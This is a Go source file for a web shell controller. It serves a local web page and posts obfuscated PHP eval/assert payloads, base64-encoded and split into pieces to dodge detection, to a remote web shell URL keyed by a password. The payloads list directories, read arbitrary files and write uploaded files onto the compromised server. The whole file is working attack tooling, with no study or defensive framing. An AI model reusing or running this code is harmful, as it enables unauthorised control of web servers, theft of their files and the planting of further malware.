package main

import (
	"bytes"
	"encoding/base64"
	"encoding/hex"
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"os"
	"reflect"
	"regexp"
	"strings"
)

func main() {

	if err := os.MkdirAll("./upload", os.ModePerm); err != nil {
		log.Fatal("Error creating uploads directory:", err)
	}

	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {

		var buf bytes.Buffer
		errStr := "ERROR:// Path Not Found Or No Permission!"
		if r.Method == "GET" {
			http.ServeFile(w, r, "index.html")
			return
		}

		// file, _, _ := r.FormFile("file")
		// fmt.Println("file", file)
		add := func(data, url, key string) (string, error) {
			decodeData := data
			encodeData := base64.StdEncoding.EncodeToString([]byte(decodeData))
			payload := "array_map(\"ass\".\"ert\",array(\"ev\".\"Al(\\\"\\\\\\$xx=\\\\\\\"Ba\".\"SE6\".\"4_dEc\".\"OdE\\\\\\\";@ev\".\"al(\\\\\\$xx('" + encodeData + "'));\\\");\"));"

			resp, err := http.PostForm(url, map[string][]string{key: {payload}})
			if err != nil {
				fmt.Println("31", err)
				return "", err
			}
			defer resp.Body.Close()

			body, err := ioutil.ReadAll(resp.Body)
			if err != nil {
				return "", err
			}

			re := regexp.MustCompile(`<AAA>([\s\S]*?)</AAA>`)
			match := re.FindStringSubmatch(string(body))
			if len(match) > 1 {
				return match[1], nil
			} else {
				return "", errors.New("check you path")
			}

		}

		if r.Method == http.MethodPost {
			clickedWord := r.FormValue("clickedWord")
			rootPath := r.FormValue("rootPath")
			var path, result string
			var err error
			urlSend := r.FormValue("url")
			key := r.FormValue("key")

			if clickedWord == "" {
				decodeData1 := "@ini_set(\"display_errors\",\"0\");@set_time_limit(0);if(PHP_VERSION<'5.3.0'){@set_magic_quotes_runtime(0);};echo(\"<AAA>\");$D=dirname($_SERVER[\"SCRIPT_FILENAME\"]);if($D==\"\")$D=dirname($_SERVER[\"PATH_TRANSLATED\"]);print $D;;echo(\"</AAA>\");die();"

				path, err = add(decodeData1, urlSend, key)
				if err != nil {
					fmt.Println("64", err)
					http.Error(w, fmt.Sprint("Error: connection failed,wrong IP or Key"), http.StatusInternalServerError)
					return
				}

				decodeData2 := "@ini_set(\"display_errors\",\"0\");@set_time_limit(0);if(PHP_VERSION<'5.3.0'){@set_magic_quotes_runtime(0);};echo(\"<AAA>\");$D='" + path + "/';$F=@opendir($D);if($F==NULL){echo(\"ERROR:// Path Not Found Or No Permission!\");}else{$M=NULL;$L=NULL;while($N=@readdir($F)){$P=$D.'/'.$N;$T=@date(\"   Y-m-d H:i:s\",@filemtime($P));@$E=substr(base_convert(@fileperms($P),10,8),-4);$R=\"\\t\".$T.\"\\t\".@filesize($P).\"\\t\".$E.\"\\n\";if(@is_dir($P))$M.=$N.\"/\".$R;else $L.=$N.$R;}echo $M.$L;@closedir($F);};echo(\"</AAA>\");die();"

				result, err = add(decodeData2, urlSend, key)
				if err != nil || strings.Contains(result, errStr) {
					fmt.Println("72", err)
					http.Error(w, fmt.Sprint("Error: connection failed,wrong IP or Key"), http.StatusInternalServerError)
					return
				}
				fmt.Fprintf(&buf, "%s---SPLIT---%s", path, result)
			} else if rootPath == "abc" {
				if r.FormValue("url") == "" {
					http.Error(w, fmt.Sprint("Error: connection failed,wrong IP or Key"), http.StatusInternalServerError)
					return
				}
				rp := r.FormValue("path")
				fmt.Println("path7", r.FormValue("path"))
				fmt.Println("cilck7", r.FormValue("clickedWord"))
				fmt.Println("current7", r.FormValue("current"))
				index := strings.Index(r.FormValue("path"), "/")
				if index == 0 {
					path = "/"
				}
				if index != 0 {
					path = rp[:index+1]
				}
				fmt.Println("86", path)
				decodeData3 := "@ini_set(\"display_errors\",\"0\");@set_time_limit(0);if(PHP_VERSION<'5.3.0'){@set_magic_quotes_runtime(0);};echo(\"<AAA>\");$D='" + path + "/';$F=@opendir($D);if($F==NULL){echo(\"ERROR:// Path Not Found Or No Permission!\");}else{$M=NULL;$L=NULL;while($N=@readdir($F)){$P=$D.'/'.$N;$T=@date(\"   Y-m-d H:i:s\",@filemtime($P));@$E=substr(base_convert(@fileperms($P),10,8),-4);$R=\"\\t\".$T.\"\\t\".@filesize($P).\"\\t\".$E.\"\\n\";if(@is_dir($P))$M.=$N.\"/\".$R;else $L.=$N.$R;}echo $M.$L;@closedir($F);};echo(\"</AAA>\");die();"

				result, err = add(decodeData3, urlSend, key)
				if err != nil || strings.Contains(result, errStr) {
					http.Error(w, fmt.Sprint("Error: connection failed,wrong IP or Key"), http.StatusInternalServerError)
					return
				}
				fmt.Fprintf(&buf, "%s---SPLIT---%s", path, result)
			} else if r.FormValue("checkFile") == "1" {
				rawPath := r.FormValue("path")
				click := r.FormValue("clickedWord")
				tmp := rawPath + "/" + click
				nPath := strings.Replace(tmp, "//", "/", -1)
				path := strings.Replace(nPath, "///", "/", -1)
				decodeData22 := "@ini_set(\"display_errors\",\"0\");@set_time_limit(0);if(PHP_VERSION<'5.3.0'){@set_magic_quotes_runtime(0);};echo(\"<AAA>\");$F='" + path + "';$fp=@fopen($F,'r');if(@fgetc($fp)){@fclose($fp);@readfile($F);}else{echo('ERROR:// Can Not Read');};echo(\"</AAA>\");die();"
				// decodeData22 := "@ini_set(\"display_errors\",\"0\");@set_time_limit(0);if(PHP_VERSION<'5.3.0'){@set_magic_quotes_runtime(0);};echo(\"<AAA>\");$F='" + path + "';$P=@fopen($F,'r');echo(@fread($P,filesize($F)));@fclose($P);;echo(\"</AAA>\");die();"
				result, err = add(decodeData22, urlSend, key)
				if err != nil || strings.Contains(result, errStr) {
					fmt.Println("112", err)
					http.Error(w, fmt.Sprint("Error: path not found"), http.StatusInternalServerError)
					return
				}
				fmt.Fprintf(&buf, "%s---SPLIT---%s", path, result)
				path = ""
			} else {
				fmt.Println("path1", r.FormValue("path"))
				// a := strings.Compare("/var", r.FormValue("path"))
				// fmt.Println("a", a)
				fmt.Println("cilck", r.FormValue("clickedWord"))
				fmt.Println("current", r.FormValue("current"))
				click := r.FormValue("clickedWord")
				lujing := r.FormValue("path")
				fmt.Println("Type of x:", reflect.TypeOf(click))
				fmt.Printf("Type of x: %T\n", click)
				fmt.Println("path2", lujing)
				fmt.Println("---------------")
				if click == "fuck" {
					click = ""
				}
				pathh := lujing + "/" + click
				newpath := strings.Replace(pathh, "//", "/", -1)
				path = strings.Replace(newpath, "///", "/", -1)
				decodeData11 := "@ini_set(\"display_errors\",\"0\");@set_time_limit(0);if(PHP_VERSION<'5.3.0'){@set_magic_quotes_runtime(0);};echo(\"<AAA>\");$D='" + path + "/';$F=@opendir($D);if($F==NULL){echo(\"ERROR:// Path Not Found Or No Permission!\");}else{$M=NULL;$L=NULL;while($N=@readdir($F)){$P=$D.'/'.$N;$T=@date(\"   Y-m-d H:i:s\",@filemtime($P));@$E=substr(base_convert(@fileperms($P),10,8),-4);$R=\"\\t\".$T.\"\\t\".@filesize($P).\"\\t\".$E.\"\\n\";if(@is_dir($P))$M.=$N.\"/\".$R;else $L.=$N.$R;}echo $M.$L;@closedir($F);};echo(\"</AAA>\");die();"
				result, err = add(decodeData11, urlSend, key)
				if err != nil || strings.Contains(result, errStr) {
					fmt.Println("120", err)
					http.Error(w, fmt.Sprint("Error: path not found"), http.StatusInternalServerError)
					return
				}
				fmt.Fprintf(&buf, "%s---SPLIT---%s", path, result)
				path = ""
				// fmt.Fprintf(&buf, "%s---SPLIT---No word clicked.", result)
			}
		} else {
			fmt.Fprintf(&buf, "待补充...")
		}

		if _, err := w.Write(buf.Bytes()); err != nil {
			http.Error(w, fmt.Sprintf("Error: %v", err), http.StatusInternalServerError)
			return
		}

	})

	http.HandleFunc("/upload", uploadHandler)
	fmt.Println("Server is running on http://localhost:8080")
	http.ListenAndServe(":8080", nil)
}

func uploadHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method == "POST" {
		urls := r.FormValue("url")
		fmt.Println("url", urls)

		path := r.FormValue("path")
		fmt.Println("path", path)

		file, header, err := r.FormFile("file")
		if err != nil {
			http.Error(w, "Failed to get file from request", http.StatusBadRequest)
			return
		}

		fileContent, err := io.ReadAll(file)
		if err != nil {
			http.Error(w, "Unable to read the file", http.StatusInternalServerError)
			return
		}
		fmt.Println("file186", fileContent)

		hexContent := hex.EncodeToString(fileContent)

		// Print the hexadecimal content
		fmt.Println("Hexadecimal content:", hexContent)

		defer file.Close()

		decodeData := "@ini_set(\"display_errors\",\"0\");@set_time_limit(0);if(PHP_VERSION<'5.3.0'){@set_magic_quotes_runtime(0);};echo(\"<AAA>\");$f='" + path + "/" + header.Filename + "';$c=$_POST[\"z1\"];$c=str_replace(\"\\r\",\"\",$c);$c=str_replace(\"\\n\",\"\",$c);$buf=\"\";for($i=0;$i<strlen($c);$i+=2)$buf.=urldecode('%'.substr($c,$i,2));echo(@fwrite(fopen($f,'w'),$buf)?'1':'0');;echo(\"</AAA>\");die();"

		add := func(data, urls, hexData string) (string, error) {
			decodeData := data
			// decodeData = decodeData + "&z1=" + hexData
			encodeData := base64.StdEncoding.EncodeToString([]byte(decodeData))
			// payload := ""array_map(\"ass\".\"ert\",array(\"ev\".\"Al(\\\"\\\\\\$xx=\\\\\\\"Ba\".\"SE6\".\"4_dEc\".\"OdE\\\\\\\";@ev\".\"al(\\\\\\$xx('" + encodeData + "'));\\\");\"));""

			payload := "array_map(\"ass\".\"ert\",array(\"ev\".\"Al(\\\"\\\\\\$xx=\\\\\\\"Ba\".\"SE6\".\"4_dEc\".\"OdE\\\\\\\";@ev\".\"al(\\\\\\$xx('" + encodeData + "'));\\\");\"));"

			formData := url.Values{}
			formData.Add("x", payload)
			formData.Add("z1", hexData)

			resp, err := http.PostForm(urls, formData)
			if err != nil {
				fmt.Println("31", err)
				return "", err
			}
			defer resp.Body.Close()

			body, err := ioutil.ReadAll(resp.Body)
			if err != nil {
				return "", err
			}

			re := regexp.MustCompile(`<AAA>([\s\S]*?)</AAA>`)
			match := re.FindStringSubmatch(string(body))
			if len(match) > 1 {
				return match[1], nil
			} else {
				return "", errors.New("check you path")
			}

		}
		result, err := add(decodeData, urls, hexContent)

		fmt.Println("resultttttt", result)

		w.WriteHeader(http.StatusOK)
		w.Write([]byte("上传成功"))
	}

}
